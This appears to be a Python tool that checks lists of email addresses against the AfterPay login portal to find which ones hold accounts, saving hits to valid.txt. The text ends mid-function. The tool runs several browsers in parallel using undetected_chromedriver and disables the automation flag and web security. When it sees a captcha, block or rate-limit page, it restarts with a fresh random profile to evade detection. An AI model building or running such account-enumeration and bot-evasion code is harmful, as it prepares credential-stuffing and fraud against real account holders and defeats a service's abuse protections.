#!/usr/bin/env python3
"""
AfterPay Email Batch Validator
Mode batch processing dengan window size 500x500
Menggunakan list.txt untuk input email dan save ke valid.txt & invalid.txt
"""

import time
import subprocess
import signal
import logging
import threading
from queue import Queue
import undetected_chromedriver as uc
import tempfile
try:
    import psutil
    PSUTIL_AVAILABLE = True
except Exception:
    PSUTIL_AVAILABLE = False
import shutil
import os
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException


# Custom exception to represent a browser-detection scenario
class BrowserDetectedException(WebDriverException):
    """Raised when a page shows detection markers and we should rotate the browser/profile."""
    pass

# Helper detection strings that indicate browser was detected / blocked
BOT_DETECTION_MARKERS = [
    'access denied', 'unusual traffic', 'have detected', 'captcha', 'recaptcha', 'blocked',
    'error 403', 'error 429', 'corrupt', 'corrupted', 'connection reset',
    'an unknown error occurred', 'unknown error occurred', 'please try again',
    'no such window', 'web view not found', 'target window already closed',
    'something went wrong', 'temporary issue', 'service unavailable', 'try again later',
    'browser not supported', 'javascript required', 'cookies required',
    'request blocked', 'access restricted', 'verification required'
]

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def classify_page(final_url: str, page_source: str):
    """Classify the page into valid/invalid/detection.

    Returns: (is_valid: bool, is_invalid: bool, is_detection: bool, reason: str)
    """
    fu = (final_url or '').lower()
    ps = (page_source or '').lower()

    # Highest priority: detection markers - be more aggressive
    for m in BOT_DETECTION_MARKERS:
        if m in fu or m in ps:
            logger.warning(f"🤖 Bot detection marker found: '{m}' - Browser needs restart!")
            return False, False, True, f"detected_marker:{m}"

    # Check for password page (valid account)
    if '/password' in fu or 'input type=\'password\'' in ps or 'input type="password"' in ps or 'name="password"' in ps:
        return True, False, False, 'password_page'

    # Common invalid markers
    invalid_markers = [
        'account not found', "we couldn't find", "couldn't find", 'no account', 'not registered', 'no user found'
    ]
    for im in invalid_markers:
        if im in ps:
            return False, True, False, f"invalid_marker:{im}"

    # Do not classify 'signin' or 'login' as invalid by default; rely on password field or explicit messages instead

    # Fallback invalid
    return False, True, False, 'fallback_invalid'


class AfterPayBatchValidator:
    """AfterPay Email Batch Validator with 500x500 window"""
    
    def __init__(self, headless=False, random_profile=False):
        self.driver = None
        self.headless = headless
        self.random_profile = random_profile
        self.profile_dir = None
        self.create_driver()
    
    def create_driver(self):
        """Create Chrome driver with 500x500 window"""
        try:
            # Simple Chrome options
            options = uc.ChromeOptions()
            
            # Basic settings for speed
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-extensions')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            options.add_argument('--disable-features=VizDisplayCompositor')
            
            # macOS specific security bypass
            options.add_argument('--remote-debugging-port=0')
            options.add_argument('--disable-background-timer-throttling')
            options.add_argument('--disable-backgrounding-occluded-windows')
            options.add_argument('--disable-renderer-backgrounding')
            
            # Window size - Set to 500x500
            options.add_argument('--window-size=500,500')
            
            if self.headless:
                options.add_argument('--headless=new')

            # If requested, create a temporary user-data-dir (random Chrome profile)
            if self.random_profile:
                try:
                    self.profile_dir = tempfile.mkdtemp(prefix="ap_profile_")
                    options.add_argument(f"--user-data-dir={self.profile_dir}")
                    logger.info(f"🔐 Using random profile dir: {self.profile_dir}")
                except Exception as e:
                    logger.warning(f"⚠️ Could not create random profile dir: {e}")
            
            # Try to use system Chrome first
            import os
            chrome_paths = [
                "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                "/Applications/Chromium.app/Contents/MacOS/Chromium",
            ]
            
            chrome_binary = None
            for path in chrome_paths:
                if os.path.exists(path):
                    chrome_binary = path
                    logger.info(f"🔍 Found system Chrome: {path}")
                    break
            
            if chrome_binary:
                options.binary_location = chrome_binary
            
            # Create driver with fallback methods
            try:
                # Method 1: Normal undetected chrome
                self.driver = uc.Chrome(options=options, version_main=None)
                logger.info("✅ Chrome driver created (Method 1)")
                try:
                    svc = getattr(self.driver, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    if proc and getattr(proc, 'pid', None):
                        logger.info(f"🔎 Driver PID: {proc.pid}")
                except Exception:
                    pass
            except Exception as e1:
                logger.warning(f"Method 1 failed: {e1}")
                try:
                    # Method 2: With use_subprocess=False
                    self.driver = uc.Chrome(options=options, version_main=None, use_subprocess=False)
                    logger.info("✅ Chrome driver created (Method 2)")
                except Exception as e2:
                    logger.warning(f"Method 2 failed: {e2}")
                    # Method 3: Regular selenium as fallback
                    from selenium import webdriver
                    regular_options = webdriver.ChromeOptions()
                    regular_options.add_argument('--disable-blink-features=AutomationControlled')
                    regular_options.add_argument('--no-sandbox')
                    regular_options.add_argument('--disable-dev-shm-usage')
                    regular_options.add_argument('--window-size=500,500')
                    if chrome_binary:
                        regular_options.binary_location = chrome_binary
                    self.driver = webdriver.Chrome(options=regular_options)
                    logger.info("✅ Chrome driver created (Fallback)")
            
            # Small delay after creation
            time.sleep(2)
            
            # Set timeouts to prevent hanging
            try:
                self.driver.set_page_load_timeout(20)
                self.driver.set_script_timeout(20)
            except Exception:
                pass

            # Set window size explicitly after creation
            try:
                self.driver.set_window_size(500, 500)
                logger.info("🖥️ Window size set to 500x500")
            except Exception as e:
                logger.warning(f"Could not set window size: {e}")
                msg = str(e).lower()
                # Treat specific window errors as fatal so caller can recreate driver
                if 'no such window' in msg or 'web view not found' in msg or 'target window already closed' in msg:
                    logger.error(f"❌ Fatal driver error when setting window size: {e}")
                    # Close and raise to force a re-create upstream
                    try:
                        if hasattr(self, 'driver') and self.driver:
                            try:
                                self.driver.quit()
                            except Exception:
                                pass
                    except Exception:
                        pass
                    raise
                else:
                    logger.warning(f"Could not set window size: {e}")
            # Ensure the driver is really usable by checking portal load
            try:
                if not self.wait_until_ready(timeout=20):
                    logger.warning("⚠️ Driver created but did not become ready in the allotted time")
                    raise WebDriverException("Driver not ready")
            except Exception as e:
                # bubble up to the caller which will decide how to recover
                logger.error(f"❌ Driver readiness check failed: {e}")
                raise
            # Verify driver has at least one window handle; if none, fail fast for recreate
            try:
                wh = []
                try:
                    wh = self.driver.window_handles
                except Exception as e:
                    logger.warning(f"⚠️ Error reading window handles: {e}")
                    wh = []
                if not wh:
                    logger.error("❌ Driver created but no window handles present; treating as not ready")
                    try:
                        self.driver.quit()
                    except Exception:
                        pass
                    raise WebDriverException("No window handles; driver closed or not ready")
                # Also verify the underlying process is alive if psutil is available
                try:
                    svc = getattr(self.driver, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    pid = getattr(proc, 'pid', None) if proc else None
                    if pid and PSUTIL_AVAILABLE:
                        try:
                            p = psutil.Process(pid)
                            if not p.is_running():
                                logger.error(f"❌ Driver process PID {pid} is not running; recreating")
                                try:
                                    self.driver.quit()
                                except Exception:
                                    pass
                                raise WebDriverException("Driver process not alive")
                        except Exception:
                            # If psutil says process doesn't exist, treat as not ready
                            logger.error(f"❌ Could not verify driver pid {pid}; treating as not ready")
                            try:
                                self.driver.quit()
                            except Exception:
                                pass
                            raise WebDriverException("Driver process not alive")
                except Exception:
                    pass
            except Exception:
                raise
            
        except Exception as e:
            logger.error(f"❌ Error creating driver: {e}")
            raise
    
    def save_to_file(self, email, status, url):
        """Save email result to appropriate file"""
        try:
            if status == 'valid':
                filename = 'valid.txt'
                message = f"✅ VALID - {email}\n"
            else:
                filename = 'invalid.txt'
                message = f"❌ INVALID - {email}\n"
            
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(message)
            logger.info(f"💾 Saved to {filename}: {email}")
            
        except Exception as e:
            logger.error(f"❌ Error saving to file: {e}")
    
    def validate_email(self, email, timeout=15):
        """Validate single email"""
        try:
            logger.info(f"🔍 Testing: {email}")
            
            # Go to AfterPay portal
            logger.info("🌐 Opening AfterPay portal...")
            self.driver.get("https://portal.afterpay.com/en-US")
            
            # Wait for and find email input
            email_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email'], input[name='email']"))
            )
            logger.info("📧 Found email input")
            
            # Wait a bit for page to fully load
            time.sleep(2)
            
            # Clear and type email
            email_input.clear()
            for char in email:
                email_input.send_keys(char)
                time.sleep(0.02)
            
            logger.info(f"⌨️ Typed: {email}")
            
            # Find and click continue button
            continue_button = WebDriverWait(self.driver, 2).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            logger.info("🔘 Found button")
            
            continue_button.click()
            logger.info("👆 Clicked Continue")
            
            # Wait for page to load a bit
            time.sleep(1.5)

            # First try to detect presence of a password field using DOM elements (reliable indicator of valid account)
            password_present = False
            try:
                pw_elem = WebDriverWait(self.driver, 3).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password'], input[name='password']"))
                )
                if pw_elem:
                    password_present = True
            except TimeoutException:
                password_present = False
            
            # Check final URL
            final_url = self.driver.current_url
            logger.info(f"🌐 Final URL: {final_url}")

            # Also check page content for bot detection/corruption and classify result
            page_source = ''
            try:
                page_source = self.driver.page_source
            except Exception:
                pass

            # Check specifically for "An unknown error occurred. Please try again."
            if page_source and "An unknown error occurred. Please try again." in page_source:
                logger.warning("⚠️ Detected 'An unknown error occurred'. Triggering hard reload (clear cache)...")
                raise BrowserDetectedException("An unknown error occurred. Please try again.")

            # Use DOM detection first; classify as valid if password input present
            if password_present:
                is_valid, is_invalid, is_detection, reason = True, False, False, 'password_field'
            else:
                is_valid, is_invalid, is_detection, reason = classify_page(final_url, page_source)
                logger.info(f"🔎 Classification: valid={is_valid} invalid={is_invalid} detect={is_detection} reason={reason}")

                # If ambiguous fallback invalid, give it one quick retry to avoid false negatives
                if is_invalid and reason == 'fallback_invalid':
                    logger.info(f"⚠️ Ambiguous result for {email}, re-checking once before marking invalid...")
                    time.sleep(1.5)
                    final_url = self.driver.current_url
                    try:
                        page_source = self.driver.page_source
                    except Exception:
                        page_source = ''
                    is_valid2, is_invalid2, is_detection2, reason2 = classify_page(final_url, page_source)
                    logger.info(f"🔁 Re-check classification: valid={is_valid2} invalid={is_invalid2} detect={is_detection2} reason={reason2}")
                    # keep detection if seen
                    if is_detection2:
                        raise WebDriverException(f"Browser detected/blocked due to: {reason2}")
                    is_valid, is_invalid, is_detection, reason = is_valid2, is_invalid2, is_detection2, reason2
            if is_detection:
                logger.error(f"❗ Browser blocked/detected (reason={reason}) for {email}")
                # Raise our custom exception so caller can distinguish detection vs other webdriver errors
                raise BrowserDetectedException(f"Browser detected/blocked due to: {reason}")
            
            # Determine if valid/invalid
            # We already used classify_page; use its results
            
            if is_valid:
                logger.info(f"✅ VALID: {email}")
                self.save_to_file(email, 'valid', final_url)
            else:
                logger.info(f"❌ INVALID: {email}")
                self.save_to_file(email, 'invalid', final_url)
            
            return {
                'email': email,
                'valid': is_valid,
                'final_url': final_url,
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
        except TimeoutException:
            logger.error(f"⏰ Timeout for: {email}")
            self.save_to_file(email, 'invalid', 'TIMEOUT')
            return {
                'email': email,
                'valid': False,
                'final_url': 'TIMEOUT',
                'error': 'Timeout',
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
            }
        except Exception as e:
            logger.error(f"❌ Error validating {email}: {e}")
            self.save_to_file(email, 'invalid', f'ERROR: {str(e)}')
            return {
                'email': email,
                'valid': False,
                'final_url': f'ERROR: {str(e)}',
                'error': str(e),
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
            }
    
    def close(self):
        """Close browser"""
        try:
            if self.driver:
                try:
                    # Try to gracefully close, prefer driver.close() then quit()
                    try:
                        if hasattr(self.driver, 'close'):
                            try:
                                self.driver.close()
                            except Exception:
                                pass
                        self.driver.quit()
                        logger.info("🚪 Browser closed (quit called)")
                    except Exception as inner_e:
                        # Some drivers (mock) may not have quit/close; ignore and continue to force kill
                        logger.warning(f"⚠️ Error calling driver.close()/quit(): {inner_e}")
                except Exception as e:
                    logger.warning(f"⚠️ Error calling driver.quit(): {e}")
                # (Deprecated older termination block removed)
                # Ensure process killed if still running
                try:
                    svc = getattr(self.driver, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    pid = getattr(proc, 'pid', None) if proc else None
                    if pid:
                        # Attempt graceful termination then force kill
                        # Try a number of escalation steps: proc.kill -> psutil -> os.kill -> subprocess kill -9
                        for attempt_kill in range(3):
                            try:
                                # Step 1: call service.process.kill if available
                                if hasattr(proc, 'kill') and callable(proc.kill):
                                    try:
                                        proc.kill()
                                    except Exception:
                                        pass
                                # Step 2: psutil-based terminate/killing of children & parent
                                if PSUTIL_AVAILABLE:
                                    try:
                                        p = psutil.Process(pid)
                                        children = p.children(recursive=True)
                                        for c in children:
                                            try:
                                                c.terminate()
                                            except Exception:
                                                pass
                                        gone, alive = psutil.wait_procs(children, timeout=1)
                                        try:
                                            p.terminate()
                                        except Exception:
                                            pass
                                        p.wait(timeout=1)
                                    except Exception:
                                        pass
                                # Step 3: fallback to os.kill
                                try:
                                    os.kill(pid, signal.SIGTERM)
                                except Exception:
                                    pass
                                time.sleep(0.2)
                                # If still alive, escalate
                                try:
                                    os.kill(pid, 0)
                                    # process is still alive, escalate
                                    try:
                                        os.kill(pid, signal.SIGKILL)
                                    except Exception:
                                        pass
                                except Exception:
                                    # Process is gone
                                    break
                                time.sleep(0.2)
                            except Exception:
                                pass
                        # If still alive after above, attempt subprocess kill -9 and group kill
                        try:
                            try:
                                os.kill(pid, 0)
                                # kill group
                                try:
                                    pgid = os.getpgid(pid)
                                    if pgid:
                                        os.killpg(pgid, signal.SIGKILL)
                                except Exception:
                                    pass
                                subprocess.run(["kill", "-9", str(pid)], check=False)
                                time.sleep(0.2)
                            except Exception:
                                pass
                        except Exception:
                            pass
                        try:
                            # If the service object provides a kill method, use it first
                            if hasattr(proc, 'kill') and callable(proc.kill):
                                try:
                                    proc.kill()
                                except Exception:
                                    pass
                            if PSUTIL_AVAILABLE:
                                p = psutil.Process(pid)
                                children = p.children(recursive=True)
                                for c in children:
                                    try:
                                        c.terminate()
                                    except Exception:
                                        pass
                                gone, alive = psutil.wait_procs(children, timeout=1)
                                try:
                                    p.terminate()
                                except Exception:
                                    pass
                                p.wait(timeout=1)
                                logger.info(f"🧹 Terminated driver process PID {pid} (via psutil)")
                        except Exception:
                            # Fallback to os.kill
                            try:
                                os.kill(pid, signal.SIGTERM)
                                time.sleep(0.5)
                                # If still alive, send SIGKILL
                                try:
                                    os.kill(pid, 0)
                                    os.kill(pid, signal.SIGKILL)
                                    logger.info(f"🧹 Killed driver process PID {pid} (SIGKILL)")
                                except Exception:
                                    # Already gone
                                    pass
                            except Exception as e:
                                logger.warning(f"⚠️ Could not kill process PID {pid}: {e}")
                except Exception:
                    pass
                # Final fallback: use system kill via shell to make sure it's removed
                try:
                    alive = True
                    try:
                        os.kill(pid, 0)
                        alive = True
                    except Exception:
                        alive = False
                    if alive:
                        logger.info(f"🔎 Attempting final kill via system command for PID {pid}")
                        try:
                            subprocess.run(["kill", "-9", str(pid)], check=False)
                            time.sleep(0.2)
                            try:
                                os.kill(pid, 0)
                                logger.warning(f"⚠️ PID {pid} still exists after kill -9")
                            except Exception:
                                logger.info(f"🧹 PID {pid} removed after kill -9")
                        except Exception as e:
                            logger.warning(f"⚠️ Error running kill -9 for pid {pid}: {e}")
                except Exception:
                    pass
            # Clean up temporary profile dir if it was created
            if getattr(self, 'profile_dir', None):
                try:
                    shutil.rmtree(self.profile_dir, ignore_errors=True)
                    logger.info(f"🧹 Removed temporary profile dir: {self.profile_dir}")
                except Exception as e:
                    logger.warning(f"⚠️ Could not remove profile dir {self.profile_dir}: {e}")
                finally:
                    self.profile_dir = None
        except Exception as e:
            logger.error(f"Error closing browser: {e}")

    def wait_until_ready(self, check_url: str = "https://portal.afterpay.com/en-US", timeout: int = 20) -> bool:
        """Attempt to load check_url and ensure an expected element is present.

        Returns True if loaded and ready, False otherwise.
        """
        if not self.driver:
            return False
        start = time.time()
        try:
            # Keep trying until timeout
            while time.time() - start < timeout:
                try:
                    self.driver.get(check_url)
                    WebDriverWait(self.driver, 6).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email'], input[name='email']"))
                    )
                    logger.info("✅ Browser ready: email input found")
                    return True
                except Exception as inner_e:
                    logger.debug(f"Waiting for browser readiness: {inner_e}")
                    time.sleep(0.5)
            return False
        except Exception as e:
            logger.warning(f"⚠️ Browser readiness check failed: {e}")
            return False

class AfterPayBatchProcessor:
    """Batch processor for multiple emails"""
    
    def __init__(self, num_browsers=3, headless=False, progress_callback=None, summary_callback=None, stop_event=None, restart_callback=None, ready_callback=None, driver_startup_attempts: int = 12, driver_startup_timeout: int = 20, stagger_between_browsers: float = 1.2):
        self.num_browsers = num_browsers
        self.headless = headless
        self.email_queue = Queue()
        self.results = []
        self.results_lock = threading.Lock()
        self.progress_callback = progress_callback
        self.summary_callback = summary_callback
        self.processing_callback = None
        self._stop_event = stop_event or threading.Event()
        self._pause_event = threading.Event()
        self.restart_callback = restart_callback
        self.ready_callback = ready_callback
        # Startup attempts/timeouts configurable
        self.driver_startup_attempts = driver_startup_attempts
        self.driver_startup_timeout = driver_startup_timeout
        self.stagger_between_browsers = stagger_between_browsers
        # Track PIDs for created driver processes by browser id
        self.browser_pids = {}
        # Lock for pid registry
        self._pid_lock = threading.Lock()

    def _register_pid(self, browser_id: int, pid: int):
        try:
            with self._pid_lock:
                self.browser_pids[browser_id] = pid
        except Exception:
            pass

    def _unregister_pid(self, browser_id: int):
        try:
            with self._pid_lock:
                self.browser_pids.pop(browser_id, None)
        except Exception:
            pass

    def _kill_pid(self, pid: int):
        try:
            if PSUTIL_AVAILABLE:
                try:
                    p = psutil.Process(pid)
                    for c in p.children(recursive=True):
                        try:
                            c.kill()
                        except Exception:
                            pass
                    p.kill()
                except Exception:
                    try:
                        os.kill(pid, 9)
                    except Exception:
                        pass
            else:
                try:
                    os.kill(pid, 9)
                except Exception:
                    pass
        except Exception:
            pass

    def cleanup_orphan_drivers(self):
        """Kill old undetected_chromedriver processes that are not tracked by this processor.

        This targets processes that include 'ap_profile_' or 'undetected_chromedriver' in their commandline.
        """
        if not PSUTIL_AVAILABLE:
            logger.debug("psutil not available - skipping orphan driver cleanup")
            return
        
        logger.info("🧹 Cleaning up orphan drivers...")
        start_cleanup = time.time()
        my_pid = os.getpid()
        
        try:
            current_pids = set()
            with self._pid_lock:
                for v in self.browser_pids.values():
                    if v:
                        current_pids.add(v)
            
            # Use a faster iteration if possible, and limit time
            for p in psutil.process_iter(['pid', 'cmdline', 'create_time']):
                # Safety timeout - don't spend more than 5 seconds cleaning up
                if time.time() - start_cleanup > 5:
                    logger.warning("⚠️ Orphan cleanup timed out, skipping remaining checks")
                    break
                    
                try:
                    pid = p.info.get('pid')
                    if pid == my_pid:
                        continue
                        
                    cmdline = ' '.join(p.info.get('cmdline') or [])
                    if not cmdline:
                        continue
                    
                    # Check for our specific markers
                    if ('ap_profile_' in cmdline or 'undetected_chromedriver' in cmdline or 'undetect' in cmdline) and pid not in current_pids:
                        try:
                            logger.info(f"🧹 Killing orphan driver PID {pid}")
                            p.kill()
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception as e:
            logger.warning(f"⚠️ Error during orphan cleanup: {e}")
        
    def load_emails_from_file(self, filename='list.txt'):
        """Load emails from file"""
        emails = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    email = line.strip()
                    if email and '@' in email:
                        emails.append(email)
            
            logger.info(f"📋 Loaded {len(emails)} emails from {filename}")
            return emails
            
        except FileNotFoundError:
            logger.error(f"❌ File {filename} not found!")
            return []
        except Exception as e:
            logger.error(f"❌ Error loading emails: {e}")
            return []
    
    def browser_worker(self, browser_id):
        """Worker thread for processing emails"""
        logger.info(f"🚀 Browser {browser_id} starting...")
        
        try:
            # Create validator for this browser; if creation or readiness fails, keep retrying
            max_startup_attempts = self.driver_startup_attempts
            while not self._stop_event.is_set():
                # If paused before starting, wait until resumed
                while self._pause_event.is_set() and not self._stop_event.is_set():
                    time.sleep(0.2)

                validator = None
                for attempt in range(1, max_startup_attempts + 1):
                    try:
                        logger.info(f"🔧 Browser {browser_id} startup attempt {attempt}/{max_startup_attempts}")
                        # Use random profile after the 1st attempt to minimize re-detection
                        validator = AfterPayBatchValidator(headless=self.headless, random_profile=(attempt > 1))
                        if validator and validator.wait_until_ready(timeout=self.driver_startup_timeout):
                            logger.info(f"✅ Validator for browser {browser_id} confirmed ready (attempt {attempt})")
                            # Register pid and notify readiness
                            try:
                                svc = getattr(validator, 'service', None)
                                proc = getattr(svc, 'process', None) if svc else None
                                pid = getattr(proc, 'pid', None) if proc else None
                                if pid:
                                    with self._pid_lock:
                                        self.browser_pids[browser_id] = pid
                                    logger.info(f"🔎 Registered Browser {browser_id} PID: {pid}")
                                if callable(self.ready_callback):
                                    try:
                                        self.ready_callback(browser_id, pid)
                                    except Exception:
                                        pass
                            except Exception:
                                pass
                            break
                        else:
                            logger.warning(f"⚠️ Validator for browser {browser_id} not ready (attempt {attempt})")
                            try:
                                if validator:
                                    validator.close()
                            except Exception:
                                pass
                            validator = None
                    except Exception as e:
                        logger.warning(f"⚠️ Could not create validator (attempt {attempt}): {e}")
                        try:
                            if validator:
                                validator.close()
                        except Exception:
                            pass
                        validator = None
                    finally:
                        # small backoff before next attempt
                        time.sleep(min(0.5 * attempt, 5))

                if not validator:
                    logger.error(f"❌ Could not create a ready validator for browser {browser_id} after {max_startup_attempts} attempts; sleeping and retrying...")
                    time.sleep(5)
                    continue
                # We've got a ready validator; break startup loop to process emails
                break
            
            while not self.email_queue.empty() and not self._stop_event.is_set():
                # Ensure validator exists; if it's None (previous close failed), try creating again
                if validator is None:
                    try:
                        validator = AfterPayBatchValidator(headless=self.headless)
                        logger.info(f"🔁 Recreated validator for browser {browser_id}")
                    except Exception as e:
                        logger.warning(f"⚠️ Could not recreate validator for browser {browser_id}: {e}")
                        time.sleep(0.5)
                        continue
                # Pause functionality: if pause is requested, block here until resumed or stopped
                while self._pause_event.is_set() and not self._stop_event.is_set():
                    time.sleep(0.2)
                try:
                    email = self.email_queue.get(timeout=1)
                except Exception:
                    # queue empty or timeout; loop again
                    continue

                try:
                    logger.info(f"🌐 Browser {browser_id} processing: {email}")

                    # Break early if a stop was requested
                    if self._stop_event.is_set():
                        break

                    # Make sure validator is still available and ready; recreate if needed
                    if validator is None:
                        try:
                            validator = AfterPayBatchValidator(headless=self.headless, random_profile=True)
                            if not validator.wait_until_ready(timeout=self.driver_startup_timeout):
                                logger.warning(f"⚠️ Newly-created validator for browser {browser_id} not ready; continuing")
                                validator.close()
                                validator = None
                                continue
                        except Exception as e:
                            logger.warning(f"⚠️ Could not create validator for browser {browser_id}: {e}")
                            validator = None
                            continue

                    # Notify UI/consumer that the email processing is starting NOW the validator is ready
                    try:
                        if self.processing_callback:
                            try:
                                self.processing_callback(email, browser_id)
                            except Exception:
                                pass
                    except Exception:
                        pass

                    # Attempt to validate with retries on webdriver errors
                    attempts = 0
                    max_retries = 2
                    result = None
                    requeued = False
                    while attempts <= max_retries:
                        try:
                            result = validator.validate_email(email)
                            break
                        except BrowserDetectedException as bde:
                            # Explicit browser-detected error: IMMEDIATE restart with fresh profile
                            logger.error(f"🤖 Browser {browser_id} DETECTED! Forcing immediate restart: {bde}")
                            try:
                                # Capture old pid if possible
                                old_pid = None
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    old_pid = getattr(proc, 'pid', None) if proc else None
                                except Exception:
                                    old_pid = None
                                # Unregister the old pid from tracking
                                try:
                                    if old_pid:
                                        with self._pid_lock:
                                            self.browser_pids.pop(browser_id, None)
                                except Exception:
                                    pass
                                validator.close()
                                time.sleep(1)  # Quick restart
                            except Exception:
                                pass
                            
                            # Notify restart callback for GUI
                            if callable(self.restart_callback):
                                try:
                                    self.restart_callback(browser_id, attempts + 1, f"Bot detected: {str(bde)}", old_pid)
                                except Exception:
                                    pass
                            
                            # Null out the validator so we don't reuse the closed driver
                            validator = None
                            attempts += 1
                            
                            if attempts > max_retries:
                                logger.error(f"❌ Browser {browser_id} max retries exceeded for {email} after detection")
                                result = {
                                    'email': email,
                                    'valid': False,
                                    'final_url': f'DETECTION_ERROR: {str(bde)}',
                                    'error': f'Browser detected after {max_retries} retries',
                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                                }
                                break
                                
                            # Create fresh validator with random profile IMMEDIATELY
                            try:
                                logger.info(f"🔄 Browser {browser_id} creating FRESH validator after detection")
                                validator = AfterPayBatchValidator(headless=self.headless, random_profile=True)
                                # If created, register pid
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    new_pid = getattr(proc, 'pid', None) if proc else None
                                    if new_pid:
                                        with self._pid_lock:
                                            self.browser_pids[browser_id] = new_pid
                                        logger.info(f"🔎 Registered Browser {browser_id} PID: {new_pid}")
                                except Exception:
                                    pass
                                logger.info(f"✅ Browser {browser_id} successfully restarted after detection (attempt {attempts})")
                                continue  # Retry immediately with fresh browser
                            except Exception as restart_e:
                                logger.error(f"❌ Browser {browser_id} restart error after detection: {restart_e}")
                                validator = None
                                # Break and mark as failed if can't restart
                                result = {
                                    'email': email,
                                    'valid': False,
                                    'final_url': f'RESTART_ERROR: {str(restart_e)}',
                                    'error': f'Could not restart browser after detection',
                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                                }
                                break
                        except WebDriverException as wde:
                            msg = str(wde).lower()
                            is_detection = any(m in msg for m in BOT_DETECTION_MARKERS)
                            if is_detection:
                                logger.error(f"🤖 Browser {browser_id} WebDriver DETECTION detected: {wde}")
                                # Treat as detection - force immediate restart with fresh profile
                            else:
                                logger.error(f"❌ Browser {browser_id} webdriver error: {wde}")
                            try:
                                # unregister and close
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    old_pid = getattr(proc, 'pid', None) if proc else None
                                    if old_pid:
                                        with self._pid_lock:
                                            self.browser_pids.pop(browser_id, None)
                                except Exception:
                                    pass
                                validator.close()
                                time.sleep(1)  # Quick restart delay
                            except Exception:
                                pass
                            attempts += 1
                            if attempts > max_retries:
                                logger.error(f"❌ Browser {browser_id} failed after {attempts} attempts for {email}")
                                result = {
                                    'email': email,
                                    'valid': False,
                                    'final_url': f'ERROR: {str(wde)}',
                                    'error': str(wde),
                                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                                }
                                break
                            # ALWAYS use random profile for better detection avoidance
                            try:
                                logger.info(f"🔄 Browser {browser_id} creating FRESH validator with random profile")
                                validator = AfterPayBatchValidator(headless=self.headless, random_profile=True)
                                try:
                                    svc = getattr(validator, 'service', None)
                                    proc = getattr(svc, 'process', None) if svc else None
                                    new_pid = getattr(proc, 'pid', None) if proc else None
                                    if new_pid:
                                        with self._pid_lock:
                                            self.browser_pids[browser_id] = new_pid
                                        logger.info(f"🔎 Registered Browser {browser_id} PID: {new_pid}")
                                except Exception:
                                    pass
                                
                                # Notify restart callback for GUI
                                if callable(self.restart_callback):
                                    try:
                                        old_pid = None
                                        try:
                                            if validator and validator.driver:
                                                svc = getattr(validator.driver, 'service', None)
                                                proc = getattr(svc, 'process', None) if svc else None
                                                old_pid = getattr(proc, 'pid', None) if proc else None
                                        except Exception:
                                            pass
                                        reason = "WebDriver detection" if is_detection else "WebDriver error"
                                        self.restart_callback(browser_id, attempts, reason, old_pid)
                                    except Exception:
                                        pass
                                        
                                logger.info(f"✅ Browser {browser_id} successfully restarted with fresh profile (attempt {attempts})")
                                continue
                            except Exception as restart_e:
                                logger.error(f"❌ Browser {browser_id} restart error: {restart_e}")
                                validator = None
                                continue
                        except TimeoutException:
                            logger.error(f"⏰ Timeout for: {email}")
                            result = {
                                'email': email,
                                'valid': False,
                                'final_url': 'TIMEOUT',
                                'error': 'Timeout',
                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                            }
                            break
                        except Exception as e:
                            logger.error(f"❌ Error processing {email} on browser {browser_id}: {e}")
                            result = {
                                'email': email,
                                'valid': False,
                                'final_url': f'ERROR: {str(e)}',
                                'error': str(e),
                                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                            }
                            break

                    if requeued:
                        # If we requeued due to detection, skip result storage and do not call task_done()
                        logger.info(f"🔁 Skipping storing result for {email} (requeued)")
                        continue
                    if result is None:
                        # Fallback in case
                        result = {
                            'email': email,
                            'valid': False,
                            'final_url': 'UNKNOWN',
                            'error': 'Unknown failure',
                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                        }

                    # Store result
                    with self.results_lock:
                        self.results.append(result)

                    # Callback
                    if self.progress_callback:
                        try:
                            self.progress_callback(result)
                        except Exception:
                            pass

                    logger.info(f"✅ Browser {browser_id} completed: {email} -> {'VALID' if result['valid'] else 'INVALID'}")
                    self.email_queue.task_done()
                    time.sleep(0.5)
                except Exception as e:
                    logger.error(f"❌ Browser {browser_id} loop error: {e}")
                    # If we failed at outer level, continue loop to process remaining emails
                    try:
                        if not self.email_queue.empty():
                            self.email_queue.task_done()
                    except Exception:
                        pass
                    continue
            
            # Close validator and unregister pid
            try:
                try:
                    svc = getattr(validator, 'service', None)
                    proc = getattr(svc, 'process', None) if svc else None
                    old_pid = getattr(proc, 'pid', None) if proc else None
                    if old_pid:
                        with self._pid_lock:
                            self.browser_pids.pop(browser_id, None)
                except Exception:
